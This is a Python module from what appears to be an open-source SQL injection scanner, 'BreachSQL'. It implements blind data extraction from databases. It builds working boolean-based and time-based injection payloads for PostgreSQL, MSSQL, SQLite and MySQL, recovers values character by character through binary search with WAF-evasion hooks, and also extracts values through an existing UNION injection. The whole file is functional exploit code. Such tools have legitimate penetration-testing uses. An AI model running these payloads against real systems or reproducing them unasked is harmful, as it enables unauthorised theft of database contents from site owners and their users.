# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
BreachSQL — engine/_scanner/extract.py
Blind data extraction using SUBSTRING-based boolean queries (async).
"""

from __future__ import annotations

import time
from typing import Any, Dict, List, Optional

import re as _re

from commonhuman_payloads.sqli import get_extraction_targets  # noqa: F401 (re-exported)
from ..log import get_logger
from ..http.injector import AsyncInjector
from ..http.waf_detect import EVASION_NONE
from .options import ScanOptions
from .payloads import apply_evasion
from .active import _async_fetch, _diff_score, _len_ratio
from .blind import _async_timed_fetch

logger = get_logger("breachsql.extract")

_ASCII_MIN = 32
_ASCII_MAX = 126
_MAX_NONPRINT_STREAK = 2
_MAX_EXTRACT_LEN = 256
_DIFF_THRESHOLD = 0.10
_LEN_RATIO_THRESHOLD = 0.02


async def extract_value(
    expr: str,
    surface: Dict[str, Any],
    evasions: List[str],
    opts: ScanOptions,
    injector: AsyncInjector,
    baseline: str,
    mode: str = "boolean",
) -> str:
    """Extract the string result of SQL *expr* character by character."""
    dbms = opts.dbms
    evasion = evasions[0] if evasions else EVASION_NONE

    substr_fn = "SUBSTR" if dbms in ("sqlite", "oracle") else "SUBSTRING"
    ord_fn = "ASCII"

    result_chars: List[str] = []
    nonprint_streak = 0

    for pos in range(1, _MAX_EXTRACT_LEN + 1):
        ordinal = await _binary_search_char(
            expr=expr,
            pos=pos,
            substr_fn=substr_fn,
            ord_fn=ord_fn,
            surface=surface,
            evasion=evasion,
            opts=opts,
            injector=injector,
            baseline=baseline,
            mode=mode,
        )
        if ordinal is None:
            logger.debug("extract_value: stalled at pos=%d", pos)
            break
        if ordinal < _ASCII_MIN or ordinal > _ASCII_MAX:
            nonprint_streak += 1
            if nonprint_streak >= _MAX_NONPRINT_STREAK:
                break
            continue

        nonprint_streak = 0
        ch = chr(ordinal)
        result_chars.append(ch)

    return "".join(result_chars)


async def _binary_search_char(
    expr: str,
    pos: int,
    substr_fn: str,
    ord_fn: str,
    surface: Dict[str, Any],
    evasion: str,
    opts: ScanOptions,
    injector: AsyncInjector,
    baseline: str,
    mode: str,
) -> Optional[int]:
    url        = surface["url"]
    method     = surface["method"]
    params     = surface["params"]
    param      = surface["single_param"]
    json_body  = surface.get("json_body", False)
    path_index = surface.get("path_index", 0)
    second_url = getattr(opts, "second_url", "")

    lo, hi = 0, _ASCII_MAX + 1

    while lo + 1 < hi:
        mid = (lo + hi) // 2

        if mode == "time":
            delay = opts.time_threshold
            _dbms = (opts.dbms or "auto").lower()
            if _dbms in ("postgres", "postgresql"):
                time_true_pl = (
                    f"' AND (CASE WHEN ({ord_fn}({substr_fn}(({expr}),{pos},1))>{mid})"
                    f" THEN (SELECT 1 FROM pg_sleep({delay})) ELSE 1 END)=1-- -"
                )
            elif _dbms == "mssql":
                time_true_pl = (
                    f"'; IF ({ord_fn}({substr_fn}(({expr}),{pos},1))>{mid})"
                    f" WAITFOR DELAY '0:0:{delay}'-- -"
                )
            elif _dbms == "sqlite":
                time_true_pl = (
                    f"' AND (CASE WHEN ({ord_fn}({substr_fn}(({expr}),{pos},1))>{mid})"
                    f" THEN (SELECT COUNT(*) FROM (WITH RECURSIVE r(x) AS"
                    f" (SELECT 1 UNION ALL SELECT x+1 FROM r WHERE x<1000000) SELECT x FROM r)) ELSE 1 END)=1-- -"
                )
            else:
                time_true_pl = (
                    f"' OR (SELECT IF({ord_fn}({substr_fn}(({expr}),{pos},1))>{mid}"
                    f",SLEEP({delay}),0))-- -"
                )
            time_true_pl = apply_evasion(time_true_pl, evasion)
            elapsed = await _async_timed_fetch(
                injector, url, method, params, param, time_true_pl,
                second_url=second_url, json_body=json_body, path_index=path_index,
            )
            if elapsed is None:
                return None
            condition_true = elapsed >= opts.time_threshold
        else:
            probe_payload = f"' OR {ord_fn}({substr_fn}(({expr}),{pos},1))>{mid}-- -"
            probe_pl = apply_evasion(probe_payload, evasion)

            resp_probe = await _async_fetch(injector, url, method, params, param, probe_pl,
                                            second_url=second_url, json_body=json_body,
                                            path_index=path_index)
            if resp_probe is None:
                return None

            score = _diff_score(resp_probe, baseline)
            len_r = _len_ratio(resp_probe, baseline)
            condition_true = score >= _DIFF_THRESHOLD or len_r >= _LEN_RATIO_THRESHOLD

        if condition_true:
            lo = mid
        else:
            hi = mid

    ordinal = lo + 1
    if ordinal < _ASCII_MIN or ordinal > _ASCII_MAX:
        return ordinal
    return ordinal


_UNION_PREFIX = "BSQL_OUT_"
_UNION_SUFFIX = "_BSQL_END"
_MARKER_RE    = _re.compile(r"'BreachSQL_[^']*'")


async def extract_via_union(
    expr: str,
    union_finding: Any,
    surface: Dict[str, Any],
    evasions: List[str],
    opts: ScanOptions,
    injector: AsyncInjector,
) -> str:
    """Extract a single SQL expression using a confirmed UNION injection."""
    evasion = evasions[0] if evasions else EVASION_NONE
    dbms    = (opts.dbms or "auto").lower()

    if dbms in ("sqlite", "postgres", "postgresql", "oracle"):
        cast   = f"CAST(({expr}) AS TEXT)"
        concat = f"'{_UNION_PREFIX}'||{cast}||'{_UNION_SUFFIX}'"
        concat_candidates = [concat]
    elif dbms == "mssql":
        cast   = f"CAST(({expr}) AS NVARCHAR(MAX))"
        concat = f"'{_UNION_PREFIX}'+{cast}+'{_UNION_SUFFIX}'"
        concat_candidates = [concat]
    elif dbms == "auto":
        cast_text = f"CAST(({expr}) AS TEXT)"
        cast_char = f"CAST(({expr}) AS CHAR)"
        concat_candidates = [
            f"'{_UNION_PREFIX}'||{cast_text}||'{_UNION_SUFFIX}'",
            f"CONCAT('{_UNION_PREFIX}',{cast_char},'{_UNION_SUFFIX}')",
        ]
    else:
        cast   = f"CAST(({expr}) AS CHAR)"
        concat = f"CONCAT('{_UNION_PREFIX}',{cast},'{_UNION_SUFFIX}')"
        concat_candidates = [concat]

    url        = surface["url"]
    method     = surface["method"]
    params     = surface["params"]
    param      = surface["single_param"]
    json_body  = surface.get("json_body", False)
    path_index = surface.get("path_index", 0)
    second_url = getattr(opts, "second_url", "")

    _pat = _re.compile(
        _re.escape(_UNION_PREFIX) + r"(.*?)" + _re.escape(_UNION_SUFFIX),
        _re.DOTALL,
    )

    for concat in concat_candidates:
        new_payload = _MARKER_RE.sub(concat, union_finding.payload, count=1)
        if new_payload == union_finding.payload:
            return ""

        new_payload = apply_evasion(new_payload, evasion)
        resp = await _async_fetch(injector, url, method, params, param, new_payload,
                                  second_url=second_url, json_body=json_body, path_index=path_index)
        if not resp:
            continue

        text_content = _re.sub(r"<[^>]+>", "", resp)
        clean_lower = text_content.lower()
        for m in _pat.finditer(text_content):
            before = clean_lower[max(0, m.start() - 200):m.start()]
            if "union" in before and "select" in before:
                continue
            return m.group(1)

    return ""
